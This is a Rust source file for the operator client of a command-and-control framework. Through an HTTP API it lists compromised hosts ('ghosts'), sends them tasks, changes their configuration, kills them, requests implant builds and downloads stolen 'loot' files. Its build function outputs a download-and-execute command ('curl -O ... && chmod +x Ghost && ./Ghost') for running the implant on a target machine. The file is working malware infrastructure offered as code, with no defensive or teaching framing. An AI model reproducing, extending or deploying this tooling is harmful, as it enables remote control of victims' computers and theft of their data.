use crate::models::{
    Ghost, GhostBuildRequest, GhostConfigUpdate, ReplayStartRequest, ReplayStatus, Task,
    TaskRequest,
};
use async_trait::async_trait;
use reqwest::Client;
use std::env;
use std::time::Duration;

#[async_trait]
pub trait C2Client: Send + Sync {
    async fn fetch_ghosts(&self) -> Result<Vec<Ghost>, String>;
    async fn fetch_tasks(&self, ghost_id: &str) -> Result<Vec<Task>, String>;
    async fn send_task(&self, ghost_id: &str, req: TaskRequest) -> Result<String, String>;
    async fn update_config(
        &self,
        ghost_id: &str,
        config: GhostConfigUpdate,
    ) -> Result<String, String>;
    async fn kill_ghost(&self, ghost_id: &str) -> Result<String, String>;
    async fn request_build(&self, req: GhostBuildRequest) -> Result<String, String>;
    async fn fetch_loot_list(&self) -> Result<Vec<String>, String>;
    async fn download_loot(&self, filename: &str, dest_path: &str) -> Result<String, String>;

    async fn fetch_replay_status(&self) -> Result<ReplayStatus, String>;
    async fn start_replay(&self, req: ReplayStartRequest) -> Result<ReplayStatus, String>;
    async fn stop_replay(&self) -> Result<ReplayStatus, String>;
    async fn reset_replay(&self) -> Result<ReplayStatus, String>;
}

pub struct RealClient {
    base_url: String,
    http: Client,
}

impl RealClient {
    pub fn new() -> Self {
        let url = env::var("SHADOW_URL").unwrap_or_else(|_| "127.0.0.1".to_string());
        let port = env::var("SHADOW_PORT").unwrap_or_else(|_| "9999".to_string());
        let mut api_path =
            env::var("SHADOW_API_PATH").unwrap_or_else(|_| "/api/v1/charon".to_string());

        if !api_path.starts_with('/') && !api_path.is_empty() {
            api_path = format!("/{}", api_path);
        }

        let base = if !port.is_empty() {
            format!("{}:{}{}", url, port, api_path)
        } else {
            format!("{}{}", url, api_path)
        };

        let base_url = if !base.starts_with("http") {
            format!("http://{}", base)
        } else {
            base
        };

        let base_url = base_url.trim_end_matches('/').to_string();

        let http = Client::builder()
            .timeout(Duration::from_secs(120))
            .build()
            .unwrap_or_default();

        Self { base_url, http }
    }
}

#[async_trait]
impl C2Client for RealClient {
    async fn fetch_ghosts(&self) -> Result<Vec<Ghost>, String> {
        let url = format!("{}/ghosts", self.base_url);
        self.http
            .get(&url)
            .send()
            .await
            .map_err(|e| format!("Network error: {}", e))?
            .json::<Vec<Ghost>>()
            .await
            .map_err(|e| format!("Failed to parse Ghosts JSON: {}", e))
    }

    async fn fetch_tasks(&self, ghost_id: &str) -> Result<Vec<Task>, String> {
        let url = format!("{}/ghosts/{}/tasks", self.base_url, ghost_id);
        self.http
            .get(&url)
            .send()
            .await
            .map_err(|e| format!("Network error: {}", e))?
            .json::<Vec<Task>>()
            .await
            .map_err(|e| format!("Failed to parse Tasks JSON: {}", e))
    }

    async fn send_task(&self, ghost_id: &str, req: TaskRequest) -> Result<String, String> {
        let url = format!("{}/ghosts/{}/task", self.base_url, ghost_id);
        let res = self
            .http
            .post(&url)
            .json(&req)
            .send()
            .await
            .map_err(|e| format!("Failed to send task: {}", e))?;

        if res.status().is_success() {
            Ok("Task queued successfully".to_string())
        } else {
            Err(format!("Server returned error: {}", res.status()))
        }
    }

    async fn update_config(
        &self,
        ghost_id: &str,
        config: GhostConfigUpdate,
    ) -> Result<String, String> {
        let url = format!("{}/ghosts/{}", self.base_url, ghost_id);
        let res = self
            .http
            .post(&url)
            .json(&config)
            .send()
            .await
            .map_err(|e| format!("Failed to update config: {}", e))?;

        if res.status().is_success() {
            Ok("Ghost configuration updated".to_string())
        } else {
            Err(format!("Server returned error: {}", res.status()))
        }
    }

    async fn kill_ghost(&self, ghost_id: &str) -> Result<String, String> {
        let url = format!("{}/ghosts/{}/kill", self.base_url, ghost_id);

        let res = self
            .http
            .post(&url)
            .send()
            .await
            .map_err(|e| format!("Failed to send kill signal: {}", e))?;

        if res.status().is_success() {
            Ok("Kill signal sent".to_string())
        } else {
            Err(format!("Server returned error: {}", res.status()))
        }
    }

    async fn request_build(&self, req: GhostBuildRequest) -> Result<String, String> {
        let url = format!("{}/build", self.base_url);

        let res = self
            .http
            .post(&url)
            .json(&req)
            .send()
            .await
            .map_err(|e| format!("Build request failed: {}", e))?;

        if res.status().is_success() {
            let download_path = res
                .json::<String>()
                .await
                .map_err(|e| format!("Failed to parse build response: {}", e))?;

            let shadow_url = env::var("SHADOW_URL").unwrap_or_else(|_| "127.0.0.1".to_string());
            let shadow_port = env::var("SHADOW_PORT").unwrap_or_else(|_| "9999".to_string());

            let full_url = format!("http://{}:{}{}", shadow_url, shadow_port, download_path);
            let command = format!("curl -O {} && chmod +x Ghost && ./Ghost", full_url);

            Ok(command)
        } else {
            let status = res.status();
            let error_message = res.text().await.unwrap_or_default();
            Err(format!(
                "Server returned error {}: {}",
                status, error_message
            ))
        }
    }

    async fn fetch_loot_list(&self) -> Result<Vec<String>, String> {
        let url = format!("{}/loot", self.base_url);
        self.http
            .get(&url)
            .send()
            .await
            .map_err(|e| format!("Network error {}", e))?
            .json::<Vec<String>>()
            .await
            .map_err(|e| format!("Failed to parse loot list json {}", e))
    }

    async fn download_loot(&self, filename: &str, dest_path: &str) -> Result<String, String> {
        let url = format!("{}/loot/download/{}", self.base_url, filename);
        let res = self
            .http
            .get(&url)
            .send()
            .await
            .map_err(|e| format!("Failed to download loot {}", e))?;

        if res.status().is_success() {
            let bytes = res
                .bytes()
                .await
                .map_err(|e| format!("Failed to read bytes {}", e))?;
            std::fs::write(dest_path, &bytes).map_err(|e| format!("Failed to save file {}", e))?;
            Ok(format!("Loot saved to {}", dest_path))
        } else {
            Err(format!("Server returned error {}", res.status()))
        }
    }

    async fn fetch_replay_status(&self) -> Result<ReplayStatus, String> {
        let url = format!("{}/replay", self.base_url);
        self.http
            .get(&url)
            .send()
            .await
            .map_err(|e| format!("Network error: {}", e))?
            .json::<ReplayStatus>()
            .await
            .map_err(|e| format!("Failed to parse replay status JSON: {}", e))
    }

    async fn start_replay(&self, req: ReplayStartRequest) -> Result<ReplayStatus, String> {
        let url = format!("{}/replay/start", self.base_url);
        let res = self
            .http
            .post(&url)
            .json(&req)
            .send()
            .await
            .map_err(|e| format!("Failed to start replay: {}", e))?;

        if res.status().is_success() {
            res.json::<ReplayStatus>()
                .await
                .map_err(|e| format!("Failed to parse replay start response: {}", e))
        } else {
            let status = res.status();
            let error_message = res.text().await.unwrap_or_default();
            Err(format!(
                "Server returned error {}: {}",
                status, error_message
            ))
        }
    }

    async fn stop_replay(&self) -> Result<ReplayStatus, String> {
        let url = format!("{}/replay/stop", self.base_url);
        let res = self
            .http
            .post(&url)
            .send()
            .await
            .map_err(|e| format!("Failed to stop replay: {}", e))?;

        if res.status().is_success() {
            res.json::<ReplayStatus>()
                .await
                .map_err(|e| format!("Failed to parse replay stop response: {}", e))
        } else {
            let status = res.status();
            let error_message = res.text().await.unwrap_or_default();
            Err(format!(
                "Server returned error {}: {}",
                status, error_message
            ))
        }
    }

    async fn reset_replay(&self) -> Result<ReplayStatus, String> {
        let url = format!("{}/replay/reset", self.base_url);
        let res = self
            .http
            .post(&url)
            .send()
            .await
            .map_err(|e| format!("Failed to reset replay: {}", e))?;

        if res.status().is_success() {
            res.json::<ReplayStatus>()
                .await
                .map_err(|e| format!("Failed to parse replay reset response: {}", e))
        } else {
            let status = res.status();
            let error_message = res.text().await.unwrap_or_default();
            Err(format!(
                "Server returned error {}: {}",
                status, error_message
            ))
        }
    }
}
